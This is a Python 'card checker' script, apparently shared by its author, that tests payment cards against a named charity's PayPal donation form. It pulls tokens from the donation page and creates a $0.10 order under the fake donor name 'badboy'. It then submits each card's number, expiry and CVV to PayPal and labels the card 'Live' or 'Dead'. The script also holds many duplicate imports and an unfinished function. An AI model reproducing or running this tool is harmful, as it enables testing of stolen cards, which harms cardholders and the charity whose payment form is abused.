# by Salam Hunter @T5B55

import requests
import requests
import re
import requests
import requests,time
import random
import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup
from user_agent import *
import random
import string
import requests
import requests,user_agent,re,base64,json,random
import requests
import pyfiglet
import time
import os
import webbrowser
from colorama import Fore
import string
from getuseragent import UserAgent
from user_agent import generate_user_agent
userr = generate_user_agent()

def br(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#salam hunter
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
def multiexplode(separators, string):
    for sep in separators[1:]:
        string = string.replace(sep, separators[0])
    return string.split(separators[0])

def get_str(string, start_delimiter, end_delimiter):
    try:
        start_pos = string.index(start_delimiter) + len(start_delimiter)
        end_pos = string.index(end_delimiter, start_pos)
        return string[start_pos:end_pos]
    except ValueError:
        return ""

# Simulating $_GET variables
idd = "sample_idd"
stgid = "sample_stgid"
lista = "4000123412341234:12|2025|123"

# Extracting card details
parts = multiexplode([":", "|"], lista)
cc = parts[0]
mes = parts[1]
ano = parts[2]
cvv = parts[3]

if len(mes) == 1:
    mes = f"0{mes}"
if len(ano) == 2:
    ano = f"20{ano}"

# Initial GET request
headers1 = {
    'authority': 'voyagercharity.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

response1 = requests.get('https://voyagercharity.com/pdonate/', headers=headers1)
client_token = get_str(response1.text, '<script data-namespace="wpforms_paypal_single" data-client-token="', '"')
nonce = get_str(response1.text, '"nonces":{"create":"', '",')
xtoken = get_str(response1.text, 'data-token="', '"')

decoded_token = base64.b64decode(client_token).decode('utf-8')
decoded_data = json.loads(decoded_token)
bearer1 = decoded_data['braintree']['authorizationFingerprint']
bearer = decoded_data['paypal']['accessToken']

# Making POST request to create an order
headers2 = {
    'authority': 'voyagercharity.com',
    'content-type': 'multipart/form-data',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

data = {
    "wpforms[fields][3][first]": "badboy",
    "wpforms[fields][3][last]": "Chk",
    "wpforms[fields][5]": "badboychx1@gmail.com",
    "wpforms[fields][18]": "+13049758798",
    "wpforms[fields][19]": "1",
    "wpforms[fields][10]": "0.10",
    "wpforms[fields][12]": "$0.10",
    "wpforms[id]": "1014",
    "page_title": "Paypal",
    "page_url": "https://voyagercharity.com/pdonate/",
    "page_id": "1022",
    "wpforms[post_id]": "1022",
    "total": "0.1",
    "is_checkout": "false",
    "nonce": nonce
}

response2 = requests.post(
    'https://voyagercharity.com/wp-admin/admin-ajax.php?action=wpforms_paypal_commerce_create_order',
    headers=headers2,
    data=data
)

response_data = response2.json()
token = response_data['data']['id']

# Final PayPal payment confirmation
headers3 = {
    'authority': 'cors.api.paypal.com',
    'authorization': f'Bearer {bearer}',
    'content-type': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

payload = {
    "payment_source": {
        "card": {
            "number": cc,
            "expiry": f"{ano}-{mes}",
            "security_code": cvv,
            "name": "badboy",
            "attributes": {
                "verification": {
                    "method": "SCA_WHEN_REQUIRED"
                }
            }
        }
    },
    "application_context": {
        "vault": False
    }
}

response3 = requests.post(
    f'https://cors.api.paypal.com/v2/checkout/orders/{token}/confirm-payment-source',
    headers=headers3,
    json=payload
)

if "PAYER_CANNOT_PAY" in response3.text:
    print(f'Dead: {lista} => PAYER_CANNOT_PAY')
else:
    print(f'Live: {lista} => Thank you for your donation!')		
